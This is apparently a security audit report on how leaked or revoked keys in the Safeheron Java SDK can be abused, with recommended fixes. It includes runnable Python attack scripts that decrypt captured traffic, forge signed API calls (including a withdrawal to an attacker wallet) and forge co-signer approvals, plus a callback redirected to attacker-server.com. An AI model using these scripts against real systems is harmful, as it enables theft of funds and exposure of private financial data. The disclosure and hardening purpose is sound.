# Revoked / Old API Key Attack Scenarios

## The Key Ecosystem in This SDK

Every Safeheron integration involves **7 distinct cryptographic artifacts**.
When any are revoked, the SDK has **zero awareness** -- all trust decisions
happen server-side, but the SDK's code creates exploitable gaps.

```
 ARTIFACT                         WHERE USED                           WHO HOLDS IT
 ===============================  ===================================  ==============
 1. apiKey                        RequestInterceptor.java:69           Client + Safeheron
 2. rsaPrivateKey (client)        RequestInterceptor.java:80 (sign)    Client only
                                  ResponseBodyConverter.java:71 (decrypt)
 3. safeheronRsaPublicKey         RequestInterceptor.java:64 (encrypt) Client (from Safeheron)
                                  ResponseBodyConverter.java:64 (verify)
 4. webHookRsaPrivateKey          WebhookConverter.java:78 (decrypt)   Client only
 5. safeheronWebHookRsaPubKey     WebhookConverter.java:71 (verify)    Client (from Safeheron)
 6. coSignerPubKey                CoSignerConverter.java:77 (verify)    Client (from CoSigner)
 7. approvalCallbackPrivateKey    CoSignerConverter.java:191 (sign)     Client only
```

---

## SCENARIO A: Attacker Obtains the Old CLIENT RSA Private Key (#2)

### How it gets leaked
- Ex-employee had access to `config.yaml` containing `privateKey: MIIEvg...`
- Key stored in Git history, environment variable, CI/CD secrets, container image
- Heap dump from old server (key persists as immutable Java String -- VULN-07)
- Old backup tapes, decommissioned hardware

### What the attacker can do

#### A1. Decrypt ALL Historical API Responses

Every response from Safeheron encrypts the AES session key using the
**client's RSA public key** (the pair of this private key):

**ResponseBodyConverter.java:71**:
```java
byte[] aesSaltDecrypt = RsaUtil.decrypt(apiResult.getKey(), rsaPrivateKey, rsaType);
```

If the attacker has captured past network traffic (TLS inspection logs,
packet captures, SIEM data), they can:

```
1. Take the "key" field from any historical API response
2. RSA-decrypt it using the old private key -> recover AES key + IV
3. AES-decrypt the "bizContent" -> plaintext transaction data
```

**This works even AFTER revocation.** Revoking the API key on Safeheron's
console stops NEW requests, but all previously encrypted responses remain
decryptable forever with the old private key. The SDK has no forward secrecy.

```python
# Attacker script: decrypt historical captures
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import base64, json

old_private_key = RSA.import_key(open("leaked_private.pem").read())

for capture in load_pcap_responses("safeheron_traffic.pcap"):
    response = json.loads(capture)

    # Step 1: RSA-decrypt the AES key
    rsa_cipher = PKCS1_OAEP.new(old_private_key)
    aes_salt = rsa_cipher.decrypt(base64.b64decode(response["key"]))
    aes_key = aes_salt[:32]
    iv = aes_salt[32:]

    # Step 2: AES-decrypt the business content
    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    plaintext = aes_cipher.decrypt(base64.b64decode(response["bizContent"]))

    print(f"DECRYPTED: {plaintext.decode()}")
    # Contains: wallet addresses, balances, transaction IDs, amounts...
```

**What is exposed**:
- All wallet addresses and account IDs
- All transaction amounts, destinations, hashes
- All account balance snapshots
- All MPC signing results
- All Web3 signing results

#### A2. Impersonate the Client to Safeheron (If Key Not Yet Revoked)

If the old key hasn't been revoked yet (common during employee offboarding
gaps, key rotation failures):

**RequestInterceptor.java:69,80**:
```java
requestData.put("apiKey", apiKey);         // line 69
String rsaSig = RsaUtil.sign(signContent, rsaPrivateKey);  // line 80
```

The attacker can craft fully valid, signed API requests:

```python
# Attacker: make API calls as the victim
import requests, time, json
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.Cipher import PKCS1_OAEP, AES
import base64, os

STOLEN_API_KEY = "a1b2c3d4..."
STOLEN_PRIVATE_KEY = RSA.import_key(open("leaked_private.pem").read())
SAFEHERON_PUBLIC_KEY = RSA.import_key(open("safeheron_pub.pem").read())

def call_safeheron_api(endpoint, biz_content):
    # Generate AES session key
    aes_key = os.urandom(32)
    iv = os.urandom(16)

    # AES-GCM encrypt the business content
    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    ct, tag = aes_cipher.encrypt_and_digest(json.dumps(biz_content).encode())
    biz_encrypted = base64.b64encode(ct + tag).decode()

    # RSA-OAEP encrypt the AES key + IV
    rsa_cipher = PKCS1_OAEP.new(SAFEHERON_PUBLIC_KEY)
    key_encrypted = base64.b64encode(rsa_cipher.encrypt(aes_key + iv)).decode()

    # Build params (TreeMap order = alphabetical)
    timestamp = str(int(time.time() * 1000))
    params = {
        "apiKey": STOLEN_API_KEY,
        "bizContent": biz_encrypted,
        "key": key_encrypted,
        "timestamp": timestamp,
    }

    # Sign with stolen private key (exactly as RequestInterceptor.java:77-80)
    sign_content = "&".join(f"{k}={v}" for k, v in sorted(params.items()))
    h = SHA256.new(sign_content.encode())
    sig = base64.b64encode(pkcs1_15.new(STOLEN_PRIVATE_KEY).sign(h)).decode()

    params["sig"] = sig
    params["rsaType"] = "ECB_OAEP"
    params["aesType"] = "GCM_NOPADDING"

    return requests.post(f"https://api.safeheron.vip/{endpoint}", json=params)

# ---- ATTACK: List all wallets ----
resp = call_safeheron_api("v1/account/list", {"pageSize": 100, "pageNumber": 1})
print("WALLETS:", resp.json())

# ---- ATTACK: Initiate a withdrawal ----
resp = call_safeheron_api("v1/transactions/create", {
    "sourceAccountKey": "account_xxx",
    "destinationAddress": "ATTACKER_WALLET_ADDRESS",
    "coinKey": "ETH",
    "txAmount": "100"
})
print("WITHDRAWAL:", resp.json())
```

**What the attacker can do with an un-revoked API key**:
- List all accounts and wallets
- View all balances
- View transaction history
- **Initiate withdrawals** (if the API key has withdrawal permissions)
- Create MPC signing requests
- Modify account settings

#### A3. Race Condition: Key Revoked but SDK Still Using Cached Retrofit

**ServiceCreator.java:34,54**:
```java
Retrofit retrofit = retrofitMap.get(config.getApiKey());  // line 34: cached!
// ...
retrofitMap.put(config.getApiKey(), retrofit);  // line 54: cached forever!
```

The Retrofit instance is cached by `apiKey` in a HashMap that is **never
cleared**. If the victim's application:

1. Creates a service with the old API key
2. The old key is revoked on Safeheron's console
3. The application creates a new service with a NEW API key

The old Retrofit instance **still exists in `retrofitMap`**. If any code path
accidentally references the old service object, it will continue sending
requests signed with the old (revoked) key. The server will reject them,
but the old private key and config remain in memory indefinitely.

```java
// Victim code -- both instances live in memory forever
TransactionApi oldService = ServiceCreator.create(TransactionApi.class, oldConfig);
TransactionApi newService = ServiceCreator.create(TransactionApi.class, newConfig);

// oldConfig.rsaPrivateKey is STILL in retrofitMap
// and in RequestInterceptor's private field (line 30-31)
// and in ConverterFactory's config field (line 22)
// These are never cleared.
```

**No cleanup mechanism exists anywhere in the SDK.** There is no `destroy()`,
`close()`, `clearKeys()`, or any lifecycle method.

---

## SCENARIO B: Attacker Obtains the Old WEBHOOK RSA Private Key (#4)

### How it gets leaked
Same vectors as Scenario A -- this key is also stored in config files.

### What the attacker can do

#### B1. Decrypt ALL Historical Webhook Payloads

**WebhookConverter.java:78**:
```java
byte[] aesSaltDecrypt = RsaUtil.decrypt(webHook.getKey(), webHookRsaPrivateKey, rsaType);
```

Every webhook Safeheron has ever sent to this customer was encrypted with
the customer's webhook RSA public key. With the private key:

```
Captured webhook -> RSA decrypt "key" field -> get AES key + IV
                 -> AES decrypt "bizContent" -> plaintext webhook data
```

**What is exposed**:
- All transaction status changes (completed, failed, pending)
- All transaction details (amounts, addresses, hashes, fees)
- All MPC signing completion results
- All Web3 signing completion results
- AML/KYT alert details
- The full history of the customer's transaction flow

#### B2. Webhook Is Still Keyed to the Old Public Key (Rotation Gap)

If the customer rotates the webhook key pair but Safeheron's console still
has the OLD public key configured (common misconfiguration), then:

- Safeheron encrypts new webhooks with the OLD public key
- The attacker who has the OLD private key can decrypt them
- The customer's NEW private key can't decrypt them (broken integration)
- The customer thinks webhooks are "broken" while the attacker reads them

---

## SCENARIO C: Attacker Obtains the Old COSIGNER Private Key (#7)

### The approvalCallbackServicePrivateKey

This is the most dangerous key to compromise because it controls
**transaction approvals**.

#### C1. Forge Approval Responses

**CoSignerConverter.java:188-192** (deprecated path):
```java
String signContent = responseData.entrySet().stream()
    .map(entry -> entry.getKey() + "=" + entry.getValue())
    .collect(Collectors.joining("&"));
String rsaSig = RsaUtil.sign(signContent, approvalCallbackServicePrivateKey);
```

**CoSignerConverter.java:229-233** (new path):
```java
String rsaSig = RsaUtil.sign(signContent, approvalCallbackServicePrivateKey);
```

**CoSignerConverter.java:265** (V3 path):
```java
String rsaSig = RsaUtil.signPSS(signContent, approvalCallbackServicePrivateKey);
```

With this key, the attacker can **sign approval responses** that the
API Co-Signer will accept as genuine. The attack:

```
Normal flow:
  CoSigner -> "Should I approve this $1M transfer?" -> Victim's callback server
  Victim's callback server -> signs "APPROVE" with private key -> CoSigner
  CoSigner verifies signature -> Executes the transfer

Attack flow:
  CoSigner -> "Should I approve this $1M transfer?" -> Victim's callback server
  ATTACKER intercepts the callback (or the attacker IS the callback server)
  ATTACKER -> signs "APPROVE" with STOLEN private key -> CoSigner
  CoSigner verifies signature -> Executes the transfer
```

```python
# Attacker: forge co-signer approval
import time, json, base64
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

STOLEN_APPROVAL_KEY = RSA.import_key(open("leaked_approval_private.pem").read())

def forge_approval(approval_id):
    """Forge a signed APPROVE response for any approval request"""
    response_data = {
        "action": "APPROVE",
        "approvalId": approval_id
    }
    response_json = json.dumps(response_data)

    # Mirrors CoSignerConverter.responseV3Converter exactly
    timestamp = str(int(time.time() * 1000))
    params = {
        "bizContent": base64.b64encode(response_json.encode()).decode(),
        "code": "200",
        "message": "SUCCESS",
        "timestamp": timestamp,
        "version": "v3"
    }

    # Sign (sorted TreeMap order, joined by &)
    sign_content = "&".join(f"{k}={v}" for k, v in sorted(params.items()))
    h = SHA256.new(sign_content.encode())
    # Use PSS for v3 (line 265), or PKCS1v1.5 for legacy (line 191/232)
    sig = base64.b64encode(pkcs1_15.new(STOLEN_APPROVAL_KEY).sign(h)).decode()
    params["sig"] = sig

    return params

# Approve ANY transaction the co-signer asks about
approval = forge_approval("approval_abc123")
# Return this as the HTTP response to the co-signer's callback
```

#### C2. Auto-Approve Everything (If Attacker Controls the Callback URL)

If the attacker can change the callback URL in Safeheron's console (using
a compromised web console login or the old API key from Scenario A), they
redirect all co-signer approval requests to their own server:

```
CoSigner ----callback----> attacker-server.com/approve
                           (attacker signs APPROVE for everything)
                           <---- signed approval response ----
CoSigner executes ALL transactions without real human approval
```

---

## SCENARIO D: Attacker Obtains the Old SAFEHERON PUBLIC KEY (#3 or #5)

### Seems harmless? It's not.

The Safeheron public key is used for **signature verification**:

**ResponseBodyConverter.java:64**:
```java
boolean checkResult = RsaUtil.verifySign(signContent, apiResult.getSig(), safeheronRsaPublicKey);
```

**WebhookConverter.java:71**:
```java
boolean checkResult = RsaUtil.verifySign(signContent, webHook.getSig(), safeheronWebHookRsaPublicKey);
```

#### D1. The SDK Doesn't Detect Public Key Rotation

If Safeheron rotates their server-side private key (and thus their public key),
the SDK has **no mechanism to detect this**. The old public key stays in the
victim's config forever until manually changed.

After rotation:
- Safeheron signs responses with their NEW private key
- Victim's SDK tries to verify with the OLD public key
- **Every response fails signature verification**
- Application throws `SafeheronException("response signature verification failed")`
- **Complete denial of service** -- the integration is broken

The SDK provides NO:
- Public key rotation endpoint
- Key expiry checking
- Graceful fallback for key mismatch
- Alert or logging for verification failures (just throws exception)

#### D2. Stale Public Key + Attacker's Forged Responses

If the victim is still using an OLD Safeheron public key that corresponds to
a COMPROMISED Safeheron private key (hypothetical scenario where Safeheron's
old key was breached):

- Attacker has the old Safeheron private key
- Victim still trusts the corresponding old public key
- Attacker can sign fake API responses that pass verification
- Attacker can inject fake transaction results, fake balances, fake approvals

---

## SCENARIO E: The Cached Retrofit Problem (No Key Lifecycle)

### The Core Issue

**ServiceCreator.java:19**:
```java
private static volatile Map<String, Retrofit> retrofitMap = new HashMap<>();
```

This map is:
- **Never cleared** -- no `clear()`, `remove()`, or cleanup method exists
- **Keyed by apiKey** -- old keys stay mapped forever
- **Contains full config** -- via `RequestInterceptor` and `ConverterFactory`

```
retrofitMap = {
  "old-revoked-key-123" -> Retrofit(
      interceptor: RequestInterceptor(
          apiKey: "old-revoked-key-123",
          rsaPrivateKey: "MIIEvg...",        // OLD PRIVATE KEY STILL HERE
          safeheronRsaPublicKey: "MIICIj..."
      ),
      converter: ConverterFactory(
          config: SafeheronConfig(
              rsaPrivateKey: "MIIEvg...",     // OLD PRIVATE KEY STILL HERE
              apiKey: "old-revoked-key-123"
          )
      )
  ),
  "new-active-key-456" -> Retrofit(...)
}
```

### What This Means

**Even after the victim rotates their API key**, the old key material
remains in the JVM's heap memory inside three locations:

| Object | Field | File:Line |
|--------|-------|-----------|
| `RequestInterceptor` | `rsaPrivateKey` | `RequestInterceptor.java:30` |
| `RequestInterceptor` | `apiKey` | `RequestInterceptor.java:28` |
| `ConverterFactory` -> `SafeheronConfig` | `rsaPrivateKey` | `SafeheronConfig.java:25` |
| `ResponseBodyConverter` (created per-request) | `rsaPrivateKey` | `ResponseBodyConverter.java:31` |

A heap dump after key rotation reveals BOTH the old AND new keys.

---

## SCENARIO F: Cross-Key Confusion Attack

### Multiple API Keys, Shared Public Key

If a victim organization has multiple Safeheron API keys (e.g., production
and staging) that share the same `safeheronRsaPublicKey`:

**ServiceCreator.java:34**:
```java
Retrofit retrofit = retrofitMap.get(config.getApiKey());
```

The SDK caches Retrofit instances by `apiKey`. But the `safeheronRsaPublicKey`
is per-API-key on Safeheron's side. If the victim uses the WRONG public key
in their config:

- Responses signed by Safeheron's production key FAIL verification
  (because staging public key is configured)
- This looks like an attack or bug, causing operational disruption

Worse, if both keys happen to use the same Safeheron RSA key pair, a response
intended for key A could be replayed against key B since there's no API-key
binding in the signature. The signed fields are:

```java
// ResponseBodyConverter.java:55-60 -- NO apiKey in the signature!
sigMap.put("key", ...);
sigMap.put("timestamp", ...);
sigMap.put("bizContent", ...);
sigMap.put("code", ...);
sigMap.put("message", ...);
// "apiKey" is MISSING from the signature verification
```

The `apiKey` is only in the REQUEST (line 69 of RequestInterceptor), NOT
in the RESPONSE signature. So a valid response for API key A can be replayed
as a response for API key B if they share the same Safeheron RSA key pair.

---

## SCENARIO G: Complete Timeline of a Key Compromise

```
DAY 0:  Employee with access to config.yaml leaves the company

DAY 1-30: Key rotation NOT performed (common in practice)
  - Ex-employee still has: apiKey, rsaPrivateKey, safeheronRsaPublicKey
  - ATTACKER CAN: Call any Safeheron API (Scenario A2)
  - ATTACKER CAN: Initiate withdrawals, list wallets, view balances

DAY 31: Ops team rotates the API key on Safeheron console
  - Old apiKey is revoked on server side
  - ATTACKER CAN NO LONGER: Make new API calls

  BUT:
  - ATTACKER STILL HAS: Old rsaPrivateKey
  - ATTACKER CAN: Decrypt all historical traffic (Scenario A1)
  - ATTACKER CAN: Decrypt any future traffic that was encrypted
    for the old public key (if any system still uses it)

DAY 31+: Victim deploys new config with new API key
  - ServiceCreator.java caches BOTH old and new Retrofit instances
  - Old private key is in memory alongside new one (Scenario E)
  - ATTACKER CAN: Recover old key from heap dump (still in memory)

DAY 90: Victim decommissions old server without secure wipe
  - Old config.yaml on disk
  - Old heap dumps in /tmp or monitoring system
  - Old backups in cloud storage
  - ATTACKER CAN: Recover keys from any of these (Scenario A1 forever)

NEVER: Forward secrecy is achieved
  - RSA key wrapping means old private key decrypts ALL historical sessions
  - No ephemeral key exchange (no ECDHE, no DH)
  - Historical traffic is decryptable for eternity
```

---

## WHAT THE SDK SHOULD DO (But Doesn't)

| Missing Feature | Impact | Where It Should Be |
|----------------|--------|-------------------|
| Key expiry / TTL | Old keys used forever | `SafeheronConfig.java` |
| Secure key destruction | Keys persist in memory | `ServiceCreator.java`, all converters |
| Retrofit cache eviction | Old configs never cleared | `ServiceCreator.java:19` |
| API key binding in response signature | Cross-key replay possible | `ResponseBodyConverter.java:55-60` |
| Forward secrecy (ECDHE) | Historical traffic always decryptable | Protocol design |
| Key rotation detection | Silent failure on rotation | `ResponseBodyConverter.java:64` |
| Webhook key re-fetch | Stale webhook key = broken integration | `WebhookConverter.java` |
| Approval key invalidation | Old approval keys can forge approvals | `CoSignerConverter.java` |
| Memory zeroing on close | Keys recoverable from heap | All classes holding key material |
| Config validation | No check for key format, expiry, reuse | `SafeheronConfig.java` |

---

## SUMMARY: Risk Matrix for Each Key Type

| Key Artifact | If Compromised While Active | If Compromised After Revocation |
|-------------|---------------------------|-------------------------------|
| **apiKey** | Full API access, initiate transfers | No direct API access, but enables cross-key replay if response signatures lack apiKey binding |
| **rsaPrivateKey** | Decrypt all responses + sign all requests = full impersonation | Decrypt ALL historical traffic forever (no forward secrecy) |
| **webHookRsaPrivateKey** | Decrypt all webhooks in real-time | Decrypt all historical webhooks forever |
| **approvalCallbackPrivateKey** | Forge APPROVE/REJECT for any transaction = fund theft | If co-signer still trusts old public key, still forge approvals |
| **safeheronRsaPublicKey** | Not directly exploitable (it's a public key) | Stale key = denial of service when Safeheron rotates |
| **coSignerPubKey** | Not directly exploitable | Stale key = denial of service when co-signer rotates |

**Worst case**: Attacker obtains `rsaPrivateKey` + `approvalCallbackPrivateKey`
= decrypt everything + approve everything = **complete fund theft**.
